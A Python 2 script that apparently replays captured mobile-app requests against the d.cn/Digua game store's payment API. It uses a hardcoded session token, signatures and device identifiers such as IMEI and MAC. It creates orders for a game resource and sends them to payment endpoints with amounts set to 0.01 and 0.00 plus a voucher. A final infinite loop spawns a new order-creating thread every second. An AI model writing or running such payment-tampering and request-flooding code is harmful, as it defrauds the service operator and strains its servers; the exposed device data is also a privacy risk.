# -*- coding:utf-8 -*-
import requests
import json
import re
import ssl
import urllib
import threading
import time


def GetOrderId():
    url = "http://api2014.digua.d.cn/newdiguaserver/ses/pay/game/createOrder"

    headers = {
    'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 5.1; m3 note Build/LMY47I) Digua/8.4',
    'HEAD':'{"par_sig":"dab542d33a82b5ff80fb52080a162c4d","device":"m3 note","sov":"2.0","ssid":"d.cn_C(gee)","sdk":22,"mid":"11","versionCode":840,"token":"66CB932A2A874BA3A246203AFF3382C3","resolutionHeight":1920,"it":2,"emu":0,"imei":"86200703403157","vender":"ARM","version":"8.4","udid":"25496768e87599aab208fba48393bfde","clientChannelId":"100001","vp":"","dd":480,"ss":2,"gpu":"Mali-T860","sign":"f59f36e89f9a7cd7","hasRoot":0,"mac":"a4:44:d1:3e:8f:b5","appid":"1702","cid":"cf98fbdbb3649a0dd298ff97e29429a8","verifyCode":"b9a0e4cded82d1bdba350a0fef427c48","di":"c7be8f0b95bed4c33c20246d14e94de0","platform":"1","stamp":1514286524588,"ngChannelId":"0","osName":"5.1","local":"zh_CN","sswdp":"360","mmc":"0x4f0c4eff","resolutionWidth":1080,"language":"2","glEsVersion":196608}',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Host':'api2014.digua.d.cn',
    'Connection':'Keep-Alive',
    'Accept-Encoding':'gzip',
    'Content-Length':'17'
    }

    data = {
        "resourceId":"61968",
    }

    html = requests.post(url=url,headers=headers,data=data).text
    html = json.loads(html)
    print html.get("data").get("orderId")


ssl._create_default_https_context = ssl._create_unverified_context
def GetPayOrderNum():
    OrderId = str(GetOrderId())
    print OrderId

    """https://paysrv.d.cn/act/consumeV3.do?appid=1702&sig=8fbbc6756af03cd713b4a2c25ba57261&pf=1&sov=2.0&token=66CB932A2A874BA3A246203AFF3382C3&mid=11&serviceType=2&cid=100001&seqNum=1&emu=0&language=zh&local=zh_CN&nfc=4&userName=%E5%B8%9D%E5%9B%BD%E6%9D%80%E6%89%8B&amount=0.01&transNo=5220171226R8x3t47p&body=61968&subject=%E8%BF%B7%E5%A4%B1%E6%97%A0%E4%BA%BA%E5%B2%9B(%E5%90%AB%E6%95%B0%E6%8D%AE%E5%8C%85)&time=1514288087426&ss=1080x1920&ext=5220171226R8x3t47p%7C%E8%BF%B7%E5%A4%B1%E6%97%A0%E4%BA%BA%E5%B2%9B(%E5%90%AB%E6%95%B0%E6%8D%AE%E5%8C%85)%7C61968%7C11&zoneId=1&zoneName=%E5%BD%93%E4%B9%90app&roleId=11&roleName=%E5%B8%9D%E5%9B%BD%E6%9D%80%E6%89%8B&paySig=a0654c0b818ac44be1bc5a4ba35a6b1d&oa_appid=1702&mobile=2&_f=sdk"""

    url = 'https://paysrv.d.cn/act/consumeV3.do?appid=1702&sig=8fbbc6756af03cd713b4a2c25ba57261&pf=1&sov=2.0&token=66CB932A2A874BA3A246203AFF3382C3&mid=11&serviceType=2&cid=100001&seqNum=1&emu=0&language=zh&local=zh_CN&nfc=4&userName=%E5%B8%9D%E5%9B%BD%E6%9D%80%E6%89%8B&amount=0.01&transNo='+OrderId+'&body=61968&subject=%E8%BF%B7%E5%A4%B1%E6%97%A0%E4%BA%BA%E5%B2%9B(%E5%90%AB%E6%95%B0%E6%8D%AE%E5%8C%85)&time=1514287190247&ss=1080x1920&ext='+OrderId+'%7C%E8%BF%B7%E5%A4%B1%E6%97%A0%E4%BA%BA%E5%B2%9B(%E5%90%AB%E6%95%B0%E6%8D%AE%E5%8C%85)%7C61968%7C11&zoneId=1&zoneName=%E5%BD%93%E4%B9%90app&roleId=11&roleName=%E5%B8%9D%E5%9B%BD%E6%9D%80%E6%89%8B&paySig=a69fbb75b8a4b3d84dcdb74831a54333&oa_appid=1702&mobile=2&_f=sdk'
    print url

    html = urllib.urlopen(url).read()

    # html = requests.get(url).text
    reg = re.compile(r'''<input type="hidden" id="payOrderNum" value="(.*?)"/>''')
    reg = re.findall(reg,html)
    print reg

    url = "https://paysrv.d.cn/pay/balance.do?pcName=balance&seqId=vyakjnbjbO70650378241&amount=0.00&voucherId=155825&useBalance=0&pcServiceId=6&appid=1702&token=66CB932A2A874BA3A246203AFF3382C3&oa_appid=1702&oa_at=66CB932A2A874BA3A246203AFF3382C3&mid=11&sig=8fbbc6756af03cd713b4a2c25ba57261&sov=2.0&pf=1&serviceType=2&cid=100001&nfc=4&version=null"

thread = ["Thread","Thread"]

while True:
    thread.append(threading.Thread(target=GetOrderId, args=()))
    time.sleep(1)
    thread[-1].start()

